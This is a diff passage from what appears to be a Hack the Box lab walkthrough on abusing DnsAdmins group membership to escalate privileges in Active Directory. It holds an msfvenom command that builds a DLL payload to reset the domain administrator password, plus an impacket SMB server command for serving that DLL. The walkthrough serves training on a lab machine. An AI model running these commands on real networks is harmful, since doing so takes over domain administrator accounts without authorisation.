@@ -226,4 +226,15 @@ The user ryan is found to be a member of DnsAdmins. Being a member of the DnsAdm
 ```CSS
 ▶ msfvenom -p windows/x64/exec cmd='net user administrator P@s5w0rd123! /domain' -f dll > payload.dll
 ```
+Upload the `payload.dll` file.
 
+#### Impacket-Server
+```CSS
+▶ impacket-smbserver pwnshare -smb2support ./
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/1f640e54-11bc-423e-8654-79599d129966)
+
+```CSS
+
+```
+![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/e250d7a8-6133-495a-9b13-9c3eb5ff78ea)
